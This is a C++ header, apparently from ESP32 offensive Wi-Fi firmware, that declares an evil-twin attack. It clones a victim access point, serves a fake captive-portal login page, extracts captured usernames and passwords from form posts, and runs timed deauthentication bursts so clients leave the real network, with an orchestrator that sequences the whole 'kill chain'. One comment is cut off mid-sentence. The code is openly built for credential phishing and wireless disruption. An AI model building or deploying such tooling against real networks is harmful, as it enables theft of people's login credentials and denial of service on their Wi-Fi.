// Portable policy for the evil-twin payload (`wifi_evil_portal`, PLAN §2.4):
// which captive-probe URLs the portal must answer, what makes a clonable SSID
// usable for the device's own AP, and the size cap for the served page.
//
// Deliberately free of Arduino/WiFi/FS includes so every rule below is covered
// by the native tests (test/test_evil_twin). The ESP32 backends — reading
// /example.html from LittleFS (storage.cpp) and re-bringing the AP up with the
// cloned SSID (wifi_ap.cpp) — consume these helpers.
//
// Reference: the endpoint list mirrors the probe URLs Bruce's evil_portal
// registers (BruceDevices firmware main src-modules_wifi/evil_portal.cpp);
// the code here is written from scratch.
#pragma once

#include <cstddef>
#include <cstdint>
#include <string_view>

namespace evilTwin {

// The operator-editable page, served from LittleFS and packaged by buildfs.
inline constexpr const char *kPagePath = "/example.html";

// Hard cap on the served page. A portal page is uploaded by hand into
// LittleFS, so it is bounded like every other untrusted file in flash; an
// oversized or empty file falls back to defaultPage() instead of being sent.
inline constexpr size_t kMaxPageBytes = 16384;

// 802.11 SSID field: at most 32 octets.
inline constexpr size_t kMaxSsidBytes = 32;


// Cap on one decoded credential value. A form field longer than this is
// truncated: the value is untrusted input arriving over the air and must not
// be able to push the stream frame past the 1024-byte action-output cap.
inline constexpr size_t kMaxCredentialBytes = 48;

// Username/password pulled out of one captured form POST.
struct Credentials {
    char user[kMaxCredentialBytes + 1] = {};
    char pass[kMaxCredentialBytes + 1] = {};
    bool hasUser = false;
    bool hasPass = false;
};

// Extracts the credentials from an `application/x-www-form-urlencoded` body
// (what the login form in data/example.html posts). Field names are matched
// case-insensitively against the usual spellings, so an operator-renamed input
// still lands in the log; `+` and %XX are decoded. Control bytes and a
// malformed escape make that one field unusable rather than truncating the
bool parseFormCredentials(std::string_view body, Credentials &out);

// Deauth configuration for the portal run. An evil twin only pays off if
// clients leave the real AP, so the portal can push them off the target AP
// while it serves the login page. Defaults are the values used when the
// operator enables deauth without naming a reason or cadence.
struct DeauthPlan {
    bool enabled = false;
    bool hasClient = false;
    uint8_t bssid[6] = {};
    uint8_t client[6] = {};
    uint16_t reason = 1; // "unspecified" — the reason code clients expect
    uint32_t intervalMs = 100;
};

// Resolves the portal's deauth parameters. `requested` false disables deauth
// outright and ignores every other field, so a stale BSSID cannot keep frames
// flying after the operator turns the switch off. Otherwise `bssid` (the AP to
// push clients off) is mandatory: without it there is no legal target and the
// caller must answer invalid_params rather than broadcast. `client` is
// optional — omitting it deauths every client of the target AP; a malformed
// one is rejected instead of silently widening the blast radius. `reason` and
// `intervalMs` are clamped into 1..65535 and 20..5000 ms. Returns false only
// for an unusable request; `out` is then undefined.
bool buildDeauthPlan(bool requested, std::string_view bssid, std::string_view client, int64_t reason,
                     int64_t intervalMs, DeauthPlan &out);

inline constexpr uint8_t kMinChannel = 1;
inline constexpr uint8_t kMaxChannel = 13;

// True when `page` may be served as-is: non-empty, at most kMaxPageBytes, and
// not a NUL-terminated fragment (an embedded NUL would truncate the response).
bool pageUsable(std::string_view page);

// Minimal built-in page used when /example.html is missing or unusable. Kept
// deliberately tiny so it always fits flash; see data/example.html for the
// full-featured page.
const char *defaultPage();

// True for the OS captive-detection probe URLs (Apple, Android, Windows) that
// must be answered with a redirect to the login page instead of the page body.
// `url` is a request path with or without a query string; comparison ignores
// case and any trailing slash.
bool isProbePath(std::string_view url);

// True when `ssid` can be broadcast as the cloned AP name: 1..32 bytes with no
// control characters. Rejecting control bytes keeps the name printable in the
// Serial log and prevents a crafted name from breaking the beacon/AP name.
bool cloneSsidUsable(std::string_view ssid);

// True for a channel the radio can actually be moved to (1..13).
bool channelUsable(int64_t channel);

// --- evil-twin scenario orchestrator (PLAN §13, action `wifi_evil_twin`) -----
//
// A Plan-driven preset that sequences the full evil-twin kill chain as ONE
// action: clone the victim AP (open, on its channel), serve the captive portal,
// and run a targeted deauth of the victim BSSID on that same channel so clients
// roam onto the clone. Unlike `wifi_evil_portal` (where ssid/bssid/channel are
// optional knobs), this orchestrator requires all three and owns the phase and
// deauth cadence itself. Portable and wrap-safe like jam_plan; the backend
// (wifi_module.cpp) executes Step::StartTwinAp (wifiAp::startTwin + portal) and
// Step::SendDeauth (wifiAttack::buildDeauth on the clone's interface).
struct Config {
    char ssid[kMaxSsidBytes + 1]; // victim SSID to clone (NUL-terminated, 1..32)
    size_t ssidLen;               // usable SSID length (1..32)
    uint8_t bssid[6];             // victim BSSID (deauth target)
    uint8_t channel;              // victim channel (1..13, channelUsable)
    uint16_t deauthReason;        // reason code (1..65535), clamped
    uint32_t deauthIntervalMs;    // deauth burst cadence (20..5000), clamped
};

enum class Phase : uint8_t { Idle, CloningAp, Running, Stopping, Failed };
enum class Step : uint8_t { None, StartTwinAp, SendDeauth, Publish };

class Plan {
  public:
    // Validate (ssidLen 1..32, channelUsable) and clamp reason/interval; false
    // leaves the current phase, true -> CloningAp with the clamped config.
    bool begin(const Config &cfg, uint32_t nowMs);
    // Backend confirms the clone AP is up: CloningAp -> Running, deauth cadence
    // starts at nowMs. No-op outside CloningAp.
    void apReady(uint32_t nowMs);
    void fail(uint32_t nowMs);  // -> Failed (from any phase)
    void stop(uint32_t nowMs);  // -> Stopping (idempotent)
    // One orchestration step: CloningAp emits StartTwinAp once (then None until
    // apReady); Running emits SendDeauth when the cadence is due (wrap-safe) and
    // counts the burst; every other phase emits None.
    Step step(uint32_t nowMs);
    Phase phase() const { return phase_; }
    const Config &config() const { return config_; }
    uint32_t deauthBursts() const { return deauthBursts_; }

  private:
    Config config_{};
    Phase phase_ = Phase::Idle;
    uint32_t deauthDeadlineMs_ = 0;
    uint32_t deauthBursts_ = 0;
    bool twinApStarted_ = false;
};

} // namespace evilTwin
